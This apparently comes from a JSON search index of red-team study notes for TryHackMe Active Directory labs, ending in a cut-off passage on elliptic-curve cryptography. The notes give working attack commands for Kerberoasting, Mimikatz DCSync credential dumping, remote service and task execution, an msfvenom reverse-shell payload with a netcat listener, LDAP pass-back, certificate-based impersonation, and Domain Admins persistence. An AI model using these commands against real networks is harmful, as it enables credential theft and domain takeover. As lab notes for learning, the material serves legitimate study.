    "c": "Hashes and tickets  $ python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.74.3 THM.red/thm Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------- -------- -------------------------- --------- ---------- http/creds-harvestin.thm.red svc-thm 2022-06-10 10:47:33.796826 <never> $ python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.74.3 THM.red/thm -request-user svc-thm Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------- -------- -------------------------- --------- ---------- http/creds-harvestin.thm.red svc-thm 2022-06-10 10:47:33.796826 <never> [-] CCache file is not found. Skipping... [ticket] Hashcat: $ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2d64a1400df48fe8467f0e0707547013",
    "u": "https://ad.tymyrddin.dev/docs/pivot/moving",
    "t": "Moving through the network ",
    "c": "Moving through the network  Local administrator accounts may be repeated across multiple hosts on the network. Even if that is the case a local administrator cannot access a computer remotely with admin privileges using WinRM, SMB, or RPC. The local administrator must use RDP to open an administrative session on a host. This setting can be changed. The built-in default administrator account is not subject to UAC, while other local administrator accounts are. Domain accounts with local admin can open an administrative login using RDP, WinRM, SMB, or RPC. This can be disabled.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a946e73ccb1e84a130587556b2c0385f",
    "u": "https://ad.tymyrddin.dev/docs/persist/creds",
    "t": "Persistence through credentials ",
    "c": "Persistence through credentials  It is not sufficient to have a single domain controller per domain in large organisations. These domains are often used in multiple regional locations, and having a single DC would significantly delay any authentication services in AD. These organisations make use of multiple DCs. Each domain controller runs a process called the Knowledge Consistency Checker (KCC). The KCC generates a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronise information. This includes updated information such as the user’s new password and new objects such as when a new user is created. The process of replication is called DC Synchronisation. It is not just the DCs that can initiate replication. Accounts such as those belonging to the Domain Admins groups can also do it for legitimate purposes such as creating a new domain controller. A popular attack to perform is a DC Sync attack. With access to an account that has domain replication permissions, it is possible to stage a DC Sync attack to harvest credentials from a DC. Passwords  Passwords can easily be changed and will be changed by the blue team when an attacker is discovered. More reliable credentials would be: Local Administrative Accounts (Could still maintain a presence on multiple machines) Delegate Accounts (Given the right delegation, could generate silver or golden tickets) AD Service Credentials (WSUS, SCCM, Could force changes on the network) Order of Operations  Use your unprivileged credentials from the distributor to facilitate initial access Use the given Administrator credentials to perform privileged operations. Pretend that these are credentials you’ve obtained during the exploitation phase . DC Sync  SSH to THMWRK1 : ssh administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc To do a DC Sync of a single account DC Sync with Mimikatz, test it on the user credential obtained from the distributor: powershell.exe -ep bypass C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe mimikatz # lsadump::dcsync /domain:za.tryhackmloc /user:user.name To dcsync all users from the domain controller: Specify a log file in the Mimikatz session Or, exit Mimikatz and run a one-liner Log file  To enable logging on Mimikatz (change user.name to the one received from the distributor): mimikatz # log <user.name>_dcdump.txt Using '<user.name>_dcdump.txt' for logfile: OK Use the /all flag: mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all Takes a while … Once done, exit Mimikatz to finalise the dump find. Download the <user.name>_dcdump.txt or dcsyncall.txt file: scp administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc:C:/Users/Administrator.ZA/<user.name>_dcdump.txt . Recover all the usernames: cat <user.name>_dcdump.txt | grep \"SAM Username\" Recover all hashes: cat <user.name>_dcdump.txt | grep \"Hash NTLM\" One-liner  The better solution because it keeps the log files clean: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe 'lsadump::dcsync /domain:za.tryhackme.loc /all' > dcsyncall.txt Download the dcsyncall.txt file: scp administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc:C:/Users/Administrator.ZA/dcsyncall.txt . Remove Windows CRLF line endings and change to utf8 encoding dos2unix dcsyncall.txt Inspect the file with the less command, using the arrow keys to navigate, and searching for a term by hitting the / key: less dcsyncall.txt",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2f05a9495afdd1e7eb59e97693ede679",
    "u": "https://ad.tymyrddin.dev/docs/pivot/spawning",
    "t": "Spawning processes remotely ",
    "c": "Spawning processes remotely  Remote Session Port(s) Requirements PsExec TCP/445 Account must be an administrator WinRM over HTTP TCP/5985 Group Memberships: Remote Management Users WinRM over HTTPS TCP/5986 Group Memberships: Remote Management Users DCE/RPC TCP/135, TCP/49152-65535 Group Memberships: Administrators RPC over SMB Named Pipes TCP/445 Group Memberships: Administrators RPC over SMB Named Pipes TCP/139 Group Memberships: Administrators PsExec  Authentication workflow Connect to Admin$ share and upload a service binary psexesvc.exe . Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with C:\\Windows\\psexesvc.exe . Create some named pipes to handle stdin / stdout / stderr . Start a remote command prompt: .\\psexec.exe \\\\<IP target> -u <username> -p <password> -i cmd.exe WinRM  PowerShell: $username = 'user.name' $password = 'mypass' | ConvertTo-SecureString -AsPlainText -Force $credential = [pscredential]::new($username, $password) $session = New-PSSession -ComputerName target-ip -Credential $credential $session | Enter-PSSession Cleanup: $session | Remove-PSSession A single command: $username = 'user.name' $password = 'mypass' | ConvertTo-SecureString -AsPlainText -Force $credential = [pscredential]::new($username, $password) Invoke-Command -ComputerName target-ip -Credential -ScriptBlock {Get-ComputerInfo} sc.exe  Remote command execution by registering and running services on a host. The service is configured to run a command at start up. Try authenticating to the Service Control Manager using RPC first. If RPC fails: Try communicating using an SMB named pipe Register the fake service ( binpath is the command to run on the host) sc.exe \\\\<IP Target> create <fakeservice> binpath= \"net user <username> <password> /add\" start= auto Start the remote service to run the command: sc.exe \\\\<IP Target> start <fakeservice> Stop and cleanup: sc.exe \\\\<IP Target> stop <fakeservice> sc.exe \\\\<IP Target> delete <fakeservice> schtasks  Remote command/payload execution by registering a scheduled task on a host. Create and run Task: schtasks /s target-ip /RU \"SYSTEM\" /create /tn \"Task\" /tr \"powershell -command 'Get-ComputerInfo'\" /sc ONCE /sd 01/01/1970 /st 00:00 schtasks /s target-ip /run /tn \"Task\" Cleanup: schtasks /s target-ip /tn \"Task\" /DELETE /F Flag  Leverage a session on the jump host to deliver a payload to an IIS web server. The payload will connect back to the attack machine (Kali VM in my case). Use the credentials downloaded (see setup ) to ssh into thmjmp2 : ssh <username>@za.tryhackme.com@thmjmp2.za.tryhackme.com On attack machine, create a service binary payload: msfvenom -p windows/shell_reverse_tcp LHOST=<IP address VPN> LPORT=4444 -f exe-service -o iispwn.exe Use the given credentials to transfer the file to the IIS server: smbclient -c 'put iispwn.exe' -U <username> -W ZA '//thmiis.za.tryhackme.com/ADMIN$' <password> Start a listener to receive the reverse shell from the IIS server: sudo nc -lnvp 4444 Use the ssh session on thmjmp2 as reverse shell (no need for runas etc.): sc.exe \\\\thmiis.za.tryhackme.com create pwniis binpath= \"%windir%\\isspwn.exe\" start= auto sc.exe \\\\thmiis.za.tryhackme.com start pwniis Run the flag.exe file on the users desktop on THMIIS.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "093b6015291fb1fbadbc31ad08ab943f",
    "u": "https://ad.tymyrddin.dev/docs/enum/powershell",
    "t": "Through PowerShell ",
    "c": "Through PowerShell  All domain users: Get-ADUser -Filter * Find any user where name ends in ... phillips : Get-ADUser -Filter 'Name -like \"*phillips\"' Find user beth.nolan and return all properties: Get-ADUser -Identity john.doe -Properties * – All domain groups: Get-ADGroup -Filter * Pipe the Administrators group object to Get-ADGroupMember to retrieve members of the group: Get-ADGroup -Identity Administrators | Get-ADGroupMember Get any domain objects that we modified on or after a specific date and time: $modifiedDate = Get-Date '2022/10/11' Get-ADObject -Filter 'whenChanged -ge $modifiedDate' -IncludeDeletedObjects Get information about the domain from the domain controller: Get-ADDomain Change a User Password: $oldPass = Read-Host -AsSecureString -Prompt 'Enter the old password' $newPass = Read-Host -AsSecureString -Prompt 'Enter the new password' Set-ADAccountPassword -Identity user.name -OldPassword $oldpPass -NewPassword $newPass",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "85c492c2b49421e15a2ce1096456873d",
    "u": "https://ad.tymyrddin.dev/docs/breach/ldap",
    "t": "LDAP bind credentials ",
    "c": "LDAP bind credentials  Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication is similar to NTLM authentication. And with LDAP authentication, the application directly verifies the user’s credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user’s credentials. LDAP authentication is a much used mechanism with third-party (non-Microsoft) applications that integrate with AD. Examples of applications and systems: Gitlab Jenkins Custom-developed web applications Printers VPNs If any of these applications or services are exposed on the internet, the same type of attacks as leveraged against NTLM authenticated systems can be used. And because a service using LDAP authentication requires a set of AD credentials, it opens up additional attack avenues. We can attempt to recover the AD credentials used by the service to gain authenticated access to AD. LDAP pass-back  A common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom. LDAP Pass-back attacks can be performed when we gain access to a device’s configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Often, the credentials for these interfaces are kept to the default ones, such as admin:admin or admin:password . Test settings In this case, we can not directly extract the LDAP credentials because the password is hidden: We did find a username though. But we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials. Rogue LDAP server  install OpenLDAP: sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd Reconfigure the LDAP server to use za.tryhackme.com for the DNS domain name and Organisation: sudo dpkg-reconfigure -p low slapd Make it vulnerable by downgrading the supported authentication mechanisms. Create a file olcSaslSecProps.ldif : # olcSaslSecProps.ldif dn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred olcSaslSecProps : Specifies the SASL security properties noanonymous : Disables mechanisms that support anonymous login minssf : Specifies the minimum acceptable security strength with 0, meaning no protection. Use the ldif file to patch the LDAP: $ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart SASL/EXTERNAL authentication started SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth SASL SSF: 0 modifying entry \"cn=config\" Check: ldapsearch -H ldap:// -x -LLL -s base -b \"\" supportedSASLMechanisms dn: supportedSASLMechanisms: PLAIN supportedSASLMechanisms: LOGIN Capturing LDAP credentials  Click the “Test Settings” at http://printer.za.tryhackme.com/settings.aspx again, the authentication will occur in clear text. If you the rogue LDAP server is configured correctly, and is downgrading the communication, you will receive the following error: “This distinguished name contains invalid syntax”. If you receive this error, you can use a tcpdump to capture the credentials: sudo tcpdump -SX -i breachad tcp port 389 Or fire up Wireshark or tshark and find the cleartext bind request password. Stop the LDAP server. sudo systemctl disable --now slapd",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "47853655c971f82151d07233057c1ff2",
    "u": "https://ad.tymyrddin.dev/docs/persist/group",
    "t": "Persistence through group membership ",
    "c": "Persistence through group membership  Warning  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. The most privileged groups or resources are not always the best choice, as they are often more closely watched for changes by the blue team. Exploiting permission delegation gave privileges to reset user passwords, which would be good for maintaining access to workstations. A local administrator group may be less monitored than a global administrator groups, and a group nested in a privileged group may be the access needed. SSH to THMDC : ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc Create groups  Launch PowerShell powershell -ep bypass Create group in the People\\IT OU: New-ADGroup -Path \"OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 1\" -SamAccountName \"THM_nestgroup1\" -DisplayName \"THM Nest Group 1\" -GroupScope Global -GroupCategory Security Create group in the People\\Sales OU: New-ADGroup -Path \"OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 2\" -SamAccountName \"THM_nestgroup2\" -DisplayName \"THM Nest Group 2\" -GroupScope Global -GroupCategory Security Create group in the People\\Consulting OU: New-ADGroup -Path \"OU=CONSULTING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 3\" -SamAccountName \"THM_nestgroup3\" -DisplayName \"THM Nest Group 3\" -GroupScope Global -GroupCategory Security Create group in the People\\Marketing OU: New-ADGroup -Path \"OU=MARKETING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 4\" -SamAccountName \"THM_nestgroup4\" -DisplayName \"THM Nest Group 4\" -GroupScope Global -GroupCategory Security Create group in the People\\IT OU: New-ADGroup -Path \"OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 5\" -SamAccountName \"THM_nestgroup5\" -DisplayName \"THM Nest Group 5\" -GroupScope Global -GroupCategory Security Nesting  Add Group 1 to Group 2 Add-ADGroupMember -Identity 'THM_nestgroup2' -Members 'THM_nestgroup1' Add Group 2 to Group 3 Add-ADGroupMember -Identity 'THM_nestgroup3' -Members 'THM_nestgroup2' Add Group 3 to Group 4 Add-ADGroupMember -Identity 'THM_nestgroup4' -Members 'THM_nestgroup3' Add Group 4 to Group 5 Add-ADGroupMember -Identity 'THM_nestgroup5' -Members 'THM_nestgroup4' Add Group 5 to Domain Admins Add-ADGroupMember -Identity 'Domain Admins' -Members 'THM_nestgroup5' Add unprivileged user to Group 1 Add-ADGroupMember -Identity 'THM_nestgroup1' -Members 'user.name' Verify inherited privileges  SSH to thmwrk1 as the unprivileged user. ssh user.name@za.tryhackme.loc@thmwrk1.za.tryhackme.loc Try accessing a privileged resource on the domain controller: dir \\\\thmdc.za.tryhackme.loc\\c$\\Users Volume in drive \\\\thmdc.za.tryhackme.loc\\c$ is Windows Volume Serial Number is 1634-22A9 Directory of \\\\thmdc.za.tryhackme.loc\\c$ 01/04/2022 08:47 AM 103 delete-vagrant-user.ps1 05/01/2022 09:11 AM 169 dns_entries.csv 09/15/2018 08:19 AM <DIR> PerfLogs 05/11/2022 10:32 AM <DIR> Program Files 03/21/2020 09:28 PM <DIR> Program Files (x86) 05/01/2022 09:17 AM 1,725 thm-network-setup-dc.ps1 04/25/2022 07:13 PM <DIR> tmp 05/15/2022 09:16 PM <DIR> Tools 04/27/2022 08:22 AM <DIR> Users 04/25/2022 07:11 PM <SYMLINKD> vagrant [\\\\vboxsvr\\vagrant] 04/27/2022 08:12 PM <DIR> Windows 3 File(s) 1,997 bytes 8 Dir(s) 51,573,755,904 bytes free If this was a real organisation, we would not be creating new groups to nest. Instead, we would make use of the existing groups to perform nesting. This is something you would never do on a normal red team assessment and almost always dechain at this point since it breaks the organisation’s AD structure, and if we sufficiently break it, they would not be able to recover. At this point, even if the blue team was able to kick us out, the organisation would more than likely still have to rebuild their entire AD structure from scratch, resulting in significant damages.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1e760019aecfc1b87935c3bb0ff1458b",
    "u": "https://ad.tymyrddin.dev/docs/breach/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Breaching Active Directory What?  Acquire an initial set of valid Active Directory (AD) credentials for a way to authenticate to AD, allowing further enumeration on AD. Why?  To be able to exploit AD misconfigurations for privilege escalation, lateral movement, and goal execution. How?  The attack surface for gaining an initial set of credentials is usually significant. This is by no means an exhaustive list: NTLM authenticated services LDAP bind credentials Authentication relays Microsoft Deployment Toolkit Configuration files",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1a5f0ea7ad79b4626bac31aad34030de",
    "u": "https://ad.tymyrddin.dev/docs/harvest/access",
    "t": "Credential access ",
    "c": "Credential access  Credential access is where adversaries may find credentials in compromised systems and gain access to user credentials. It helps adversaries to reuse them or impersonate the identity of a user. This is an important step for lateral movement and accessing other resources such as other applications or systems. Obtaining legitimate user credentials is preferred rather than exploiting systems using CVEs. Credentials are stored insecurely in various locations in systems: Unsecured Credentials: Credentials In Files - search a compromised machine for credentials in local or remote file systems. Clear-text files could include sensitive information created by a user, containing passwords, private keys, etc. Database files Memory Password managers Enterprise Vaults Active Directory Network Sniffing PowerShell history  As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt . It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, to look for the password keyword in the Window registry: c:\\Users\\user> reg query HKLM /f password /t REG_SZ /s OR C:\\Users\\user> reg query HKCU /f password /t REG_SZ /s Database Files  Applications use database files to read or write settings, configurations, or credentials. Database files are usually stored locally in Windows operating systems. These files are an excellent target to check and hunt for credentials. Configuration files contains a showcase example of extracting credentials from the local McAfee Endpoint database file. Password Managers  A password manager is an application to store and manage users’ login information for local and Internet websites and services. Since it deals with users’ data, it must be stored securely to prevent unauthorized access. Password Manager applications can be built-in (Windows) or third-party, like KeePass, 1Password, LastPass Misconfiguration and security flaws are found in these applications that let adversaries access stored data. Various tools can be used during the enumeration stage to get sensitive data in password manager applications used by Internet browsers and desktop applications. Memory Dump  The Operating system’s memory is a rich source of sensitive information that belongs to the Windows OS, users, and other applications. Data gets loaded into memory at run time or during the execution. Thus, accessing memory is limited to administrator users who fully control the system. The following are examples of memory stored sensitive data, including clear-text credentials, cached passwords, and AD Tickets. Active Directory  Active Directory stores a lot of information related to users, groups, computers, etc. Thus, enumerating the Active Directory environment is one of the focuses of red team assessments. Active Directory has a solid design, but misconfiguration made by admins makes it vulnerable to various attacks shown in this room. The following are some Active Directory misconfigurations that may leak users’ credentials: Users’ description: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorised access. Group Policy SYSVOL: Leaked encryption keys let attackers access administrator accounts. NTDS: Contains AD users’ credentials, making it a target for attackers. AD Attacks: Misconfiguration makes AD vulnerable to various attacks. Network Sniffing  Gaining initial access to a target network enables attackers to attack local computers, including the AD environment. The Man-In-the-Middle attack against network protocols lets the attacker create a rogue or spoof trusted resources within the network to steal authentication information such as NTLM hashes. Resources  MITRE ATT&CK framework TA0006",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b0bc35781c68ca350136f4c79d2fb8cc",
    "u": "https://ad.tymyrddin.dev/docs/pivot/lateral",
    "t": "Moving laterally using wmi ",
    "c": "Moving laterally using wmi  Connecting to wmi from powershell  Create a credential object for authentication $username = 'user.name' $password = 'password' | ConvertTo-SecureString -AsPlainText -Force $credential = [pscredential]::new($username, $password) Create a CIM session for repeated use: DCOM : Connect to the target via RPC on TCP/135 , RPC will direct the client to high numbered port TCP/49152-65535 WSman : WinRM – connect via HTTP (TCP/5985) or HTTPS (TCP/5986) $server = 'target-ip / fqdn' $sessionopt = New-CimSessionOption -Protocol DCOM $session = New-CimSession -ComputerName $server -Credential $credential -SessionOption $sessionopt -ErrorAction Stop Remote process creation  We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before: $Command = \"powershell.exe -Command Set-Content -Path C:\\text.txt -Value whatever\"; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command } WMI will create the required process silently (it does not show the output of any command). On legacy systems, the same can be done using wmic from the command prompt: wmic.exe /user:<username> /password:<password> /node:TARGET process call create \"cmd.exe /c calc.exe\" Run a command remotely  Run a command in the CIM session to test if the target can connect back to the attack machine as a pre-check to a reverse shell. Used is Parameter splatting . With many thanks to 0xBEN . $kaliVpnIP = 'kali-vpn-ip' $kaliPort = 443 # Try to connect back to Kali on a TCP port of choice $command = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command `\"[Net.Sockets.TcpClient]::new().ConnectAsync('$kaliVpnIP', $kaliPort)`\"\" # Parameter splatting $parameters = @{ CimSession = $session ClassName = 'Win32_Process' MethodName = 'Create' Arguments = @{ CommandLine = $command } } Invoke-CimSession @parameters Creating services remotely  Register a service called fakeservice on the target. This only creates the service and does not execute the command specified in PathName : $parameters = @{ CimSession = $session ClassName = 'Win32_Service' MethodName = 'Create' Arguments = @{ Name = 'fakeservice' DisplayName = 'fakeservice' PathName = 'net user <username> <password> /ADD' ServiceType = [byte]16 StartMode = 'Manual' } } Invoke-CimMethod @parameters Get the service and run it on the target. This will cause the service to run and create the local user username with a password of password . $svc = Get-CimInstance -CimSession $session -ClassName Win32_Service -Filter \"Name LIKE 'fakeservice'\" $svc | Invoke-CimMethod -MethodName StartService Change the command and add the username user to the local Administrators group. $svc | Invoke-CimMethod -MethodName Change -Arguments @{PathName = 'net localgroup Administrators <username> /ADD'} $svc | Invoke-CimMethod -MethodName StartService Cleanup: $svc | Invoke-Cimmethod -MethodName StopService $svc | Invoke-CimMethod -MethodName Delete Scheduled tasks  The action is to run: cmd.exe /c net user add <username> <password> /ADD` . Payload must be split in command and arguments : $command = 'cmd.exe' $arguments = '/c net user <username> <password> /ADD' $parameters = @{ CimSession = $session Execute = $command Argument = $arguments } $action = New-ScheduledTaskAction @parameters Create the task on the remote host and assign it the action stored in the $action variable, then start the task: $parameters = @{ CimSession = $session Action = $action User = 'NT AUTHORITY\\SYSTEM' TaskName = 'taskname' } $task = Register-ScheduledTask @parameters $task | Start-ScheduledTask Add the username user to the local administrators group: $arguments = '/c net user <username> <password> /ADD' $parameters = @{ CimSession = $session Execute = $command Argument = $arguments } $action = New-ScheduledTaskAction @parameters $task = Set-ScheduledTask -CimSession $session -TaskName taskname -Action $action $task | Start-ScheduledTask $task | Unregister-ScheduledTask",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "60972a1214ecd786b5ffce8553dec1d3",
    "u": "https://ad.tymyrddin.dev/docs/pivot/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Lateral Movement and Pivoting What?  Move around the network while creating as few alerts as possible. From one system taking over another. Why?  To have alternatives to find the best path to take. For example, if another system is untouchable or more secure or if the first was not compromised. How?  Setup for THM AD Moving through the network Spawning processes remotely Moving laterally using wmi Use of alternate authentication material Abusing user behaviour Port forwarding Cleanup",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "9670818b63e9310bd8c88f2a8b062e30",
    "u": "https://ad.tymyrddin.dev/docs/exploit/certificates",
    "t": "Exploiting certificates ",
    "c": "Exploiting certificates  Active Directory Certificate Services (AD CS) is Microsoft’s PKI implementation. It is used in: Establishing trusts between domains Encryption Digital signatures Authentication Certificate templates allow an organization to offload the certificate request process to certain authorized users Finding vulnerable certificate templates  Use the RDP session on THMSERVER2 to enumerate certificate templates certutil -Template -v > .\\templates.txt A certificate template can be exploited if the following parameters are present: Client Authentication : Certificate can be used in client authentication CT_FLAG_ENROLEE_SUPPLIES_SUBJECT : Can specify an alternate SAN CTPRIVATEKEY_FLAG_EXPORTABLE_KEY : Can export the private key along with the certificate Certificate Permissions : User has the permissions to use the template SpecterOps mentions eight common security misconfigurations with AD CS, so it should be noted that there are still a significant amount of potential misconfigurations that can be found. Exploiting a Certificate Template  Using RDP access on THMSERVER2 , request a certificate. (If you use Remmina and save the config of the RDP connection, make sure to disable Restricted admin mode). Use the Microsoft Management Console (MMC): Click Start -> run Type mmc and hit enter Click File -> Add/Remove Snap-in.. Add the Certificates snap-in and make sure to select Computer Account and Local computer on the prompts. Click OK Request a personal certificate: Right Click on Personal and select All Tasks->Request New Certificate… Click Next twice to select the AD enrollment policy. You will see that we have one template that we can request, but first, we need to provide additional information. Click on the More Information warning. Change the Subject name Type option to Common Name and provide any value, since it does not matter, and click Add. Change the Alternative name Type option to User principal name. Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click Add. click Apply and OK. Select the certificate and click Enroll . You should be able to see your certificate. Export the certificate with the private key: Right-click on the certificate and select All Tasks -> Export… Click Next, select Yes, export the private key, and click Next. Click Next, then set a password for the certificate since the private key cannot be exported without a password. Click Next and select a location to store the certificate. Click Next and finally click Finish. User impersonation through a certificate  Use the certificate to request a Kerberos ticket-granting ticket (TGT) Load the Kerberos TGT into your hacking platform of choice Use Rubeus to Inject the Certificate C:\\Tools\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\\Users\\username\\Desktop\\mycert.pfx /password:Password123 /outfile:pwn.kirbi /domain:za.tryhackme.loc /dc:10.200.60.101 Use Mimikatz to Pass-the-Ticket: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe mimikatz # privilege::debug mimikatz # kerberos::ptt pwn.kirbi mimikatz # misc::cmd C:> explorer.exe Browse the file system of the domain controller from THMSERVER2 .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "daba242b5cfd794d39131cf540e0fa02",
    "u": "https://ad.tymyrddin.dev/docs/exploit/setup",
    "t": "Setup for THM AD ",
    "c": "Setup for THM AD  Connecting to the network  Download the vpn config file from THM, and use it to configure sudo openvpn --config ./<some assigned code>-exploitingad.ovpn --daemon Check PID (you get a number, if not, does not work): sudo ps aux | grep -v grep | grep -i <some assigned code>-exploitingad.ovpn | awk -v FS=' ' '{print $2}' Edit DNS configuration  Set your DNS IPv4 to the IP address of the THMCHILDDC in the network diagram (also add 1.1.1.1 for connections to the internet) and run: sudo systemctl restart NetworkManager Test hostname lookups  $ dig thmdc.za.tryhackme.loc ; <<>> DiG 9.18.7-1-Debian <<>> thmdc.za.tryhackme.loc ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 468 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;thmdc.za.tryhackme.loc. IN A ;; ANSWER SECTION: thmdc.za.tryhackme.loc. 1200 IN A 10.200.60.101 ;; Query time: 40 msec ;; SERVER: 10.200.60.101#53(10.200.60.101) (UDP) ;; WHEN: Mon Nov 07 14:15:34 GMT 2022 ;; MSG SIZE rcvd: 67 And: $ nslookup google.com ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out Server: 1.1.1.1 Address: 1.1.1.1#53 Non-authoritative answer: Name: google.com Address: 216.58.214.78 ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out Name: google.com Address: 2a00:1450:4007:818::200e Request credentials  Get your credentials from http://distributor.za.tryhackme.loc/creds . Jump in  You can now either login with ssh , for example: $ ssh za.tryhackme.loc\\\\<AD Username>@thmwrk1.za.tryhackme.loc Or by RDP: $ xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'<AD Username>' /p:'<AD Password>'",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "cc1e5ba557232f74052dcb6a6228c906",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/notes/ecc",
    "t": "Elliptic curve balls ",
    "c": "Elliptic curve balls  Elliptic Curve Cryptography (ECC) is a family of public-key cryptosystems, based on the algebraic structures of the elliptic curves over finite fields and on the difficulty of the Elliptic Curve Discrete Logarithmic Problem (ECDLP). Like RSA, ECC multiplies large numbers, but unlike RSA it does so in order to combine points on a mathematical curve, called an elliptic curve. ECC uses smaller keys and signatures than RSA for the same level of security and provides very fast key generation, fast key agreement and fast signatures. To complicate matters, there are many types of elliptic curves, efficient and inefficient ones, and secure and insecure ones. ECC crypto algorithms can use different underlying elliptic curves. Different curves provide different level of security (cryptographic strength), different performance (speed) and different key length, and also may involve different algorithms. Elliptic curves  An elliptic curve is a curve on a plane, a group of points with \\(x\\) and \\(y\\) coordinates. For example, the curve \\(y = 3\\) is a horizontal line with the vertical coordinate 3, curves of the form \\(y = ax + b\\) with fixed numbers \\(a\\) and \\(b\\) are straight lines, \\(x^2 + y^2 = 1\\) is a circle of radius \\(1\\) centered on the origin, and so on. An elliptic curve as used in cryptography is typically a curve whose equation is of the form \\(y^2 = x^3 + ax + b\\) (known as the Weierstrass form), where the constants \\(a\\) and \\(b\\) define the shape of the curve, or of the form \\(x^2 + y^2 = 1 + dx^2y^2\\) (Edwards curves). In ECC, the field is a square matrix of size \\(p x p\\) and the points on the curve are limited to integer coordinates within the field only. All algebraic operations within the field (like point addition and multiplication) result in another point within the field. ECC curves, adopted in the popular cryptographic libraries and security standards, have name (named curves, e.g. secp256k1 or Curve25519 ), field size (which defines the key length, e.g. 256-bit), security strength (usually the field size / 2 or less), performance (operations/sec) and many other parameters. ECC keys  The private keys in the ECC are integers (in the range of the curve’s field size, typically 256-bit integers). The key generation in the ECC cryptography is as simple as securely generating a random integer in certain range, so it is extremely fast. Any number within the range is valid ECC private key. The public keys in the ECC are EC points - pairs of integer coordinates \\((x, y)\\) , on the curve. Due to their special properties, EC points can be compressed to just one coordinate + 1 bit (odd or even). Thus the compressed public key, corresponding to a 256-bit ECC private key, is a 257-bit integer. ECC algorithms  Elliptic-curve cryptography (ECC) provides several groups of algorithms, based on the math of the elliptic curves over finite fields: ECC digital signature algorithms like ECDSA (for classical curves) and EdDSA (for 